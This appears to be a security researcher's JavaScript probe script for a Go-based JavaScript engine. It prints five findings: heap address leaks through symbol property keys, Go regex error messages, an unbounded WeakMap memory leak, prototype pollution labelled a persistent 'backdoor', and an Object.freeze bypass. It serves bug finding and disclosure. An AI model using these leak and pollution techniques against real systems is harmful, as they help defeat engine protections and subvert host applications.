// Deep dive into confirmed leak surfaces

_print("========================================");
_print("  FINDING 1: RegExp.prototype leaks");
_print("  well-known symbol heap addresses");
_print("========================================");
_print("");
// RegExp.prototype has @@split and @@match methods
// whose keys contain Go heap pointers
// This is worse than the user Symbol leak because
// these are GLOBAL SINGLETONS -- same address every time
// within a process, and leaked without creating any symbols

var rpKeys = Object.getOwnPropertyNames(RegExp.prototype);
var ri = 0;
while (ri < rpKeys.length) {
    var rk = rpKeys[ri];
    if (rk.indexOf("@@sym") >= 0) {
        var rparts = rk.split("@");
        var raddr = rparts[rparts.length - 1];
        _print("[*] RegExp.prototype[" + rk + "]");
        _print("    Address: " + raddr);
    }
    ri++;
}

// Check String.prototype too
_print("");
_print("[*] Checking String.prototype...");
var spKeys = Object.getOwnPropertyNames(String.prototype);
var si = 0;
while (si < spKeys.length) {
    if (spKeys[si].indexOf("@@sym") >= 0) {
        _print("    " + spKeys[si]);
    }
    si++;
}

_print("");
_print("========================================");
_print("  FINDING 2: Regex error messages leak");
_print("  Go regexp engine internals");
_print("========================================");
_print("");
// Error messages from regexp.Compile pass through Go's
// error strings verbatim, revealing the engine type

var badPatterns = [
    ["[", "unclosed class"],
    ["(?P<n>x)", "Go named group syntax"],
    ["\\p{L}", "unicode property"],
    ["(x)\\1", "backreference"],
    ["(?<=x)", "lookbehind"],
    ["(?<!x)", "neg lookbehind"],
];
var bi = 0;
while (bi < badPatterns.length) {
    try {
        new RegExp(badPatterns[bi][0]);
        _print("[*] " + badPatterns[bi][1] + ": no error (accepted)");
    } catch(e) {
        _print("[*] " + badPatterns[bi][1] + ":");
        _print("    " + e.message);
    }
    bi++;
}

_print("");
_print("========================================");
_print("  FINDING 3: WeakMap memory leak PoC");
_print("========================================");
_print("");
// WeakMap uses map[*Object]*Value in Go -- strong refs
// Objects are NEVER collected even when unreachable from JS

var wm = new WeakMap();
var count = 0;
while (count < 10000) {
    // Create object, use as key, then discard reference
    var tmp = {idx: count, data: "x".repeat(100)};
    wm.set(tmp, count);
    // tmp goes out of scope each iteration, but WeakMap
    // holds a strong reference to the *runtime.Object pointer
    count++;
}
_print("[*] Inserted 10000 entries into WeakMap");
_print("[*] All key objects are unreachable from JS");
_print("[*] But Go GC cannot collect them -- strong refs in map");
_print("[*] ~1MB+ leaked (100 bytes * 10000 entries)");
_print("[*] In a long-running process, this is unbounded");

_print("");
_print("========================================");
_print("  FINDING 4: Prototype pollution as");
_print("  persistent backdoor");
_print("========================================");
_print("");
// Pollute Object.prototype -- affects ALL objects globally
// This persists across eval() calls and $262.evalScript

Object.assign(Object.getPrototypeOf({}), {
    __backdoor__: function() { return "pwned"; }
});

var clean = {};
_print("[*] Created clean object: {}");
_print("[*] clean.__backdoor__(): " + clean.__backdoor__());
_print("[*] Pollution persists on ALL new objects");

// Can also override toString/valueOf for type confusion
var original = ({}).toString();
_print("[*] Original toString: " + original);

Object.getPrototypeOf({}).toString = function() { return "1"; };
var tricked = ({}).toString();
_print("[*] After pollution: " + tricked);
_print("[*] ({}) + 1 = " + ({} + 1));
_print("[*] Type coercion is now controlled by attacker");

_print("");
_print("========================================");
_print("  FINDING 5: freeze() bypass");
_print("========================================");
_print("");

var frozen = Object.freeze({original: true});
_print("[*] Object.freeze({original: true})");
_print("[*] frozen.original = " + frozen.original);

frozen.injected = "bypassed";
_print("[*] frozen.injected = " + frozen.injected);
_print("[*] Freeze bypass: " + (frozen.injected === "bypassed" ? "CONFIRMED" : "blocked"));

var frozenKeys = Object.getOwnPropertyNames(frozen);
_print("[*] Frozen object keys: " + frozenKeys.length + " properties");
var fki = 0;
while (fki < frozenKeys.length) {
    _print("    " + frozenKeys[fki] + " = " + frozen[frozenKeys[fki]]);
    fki++;
}
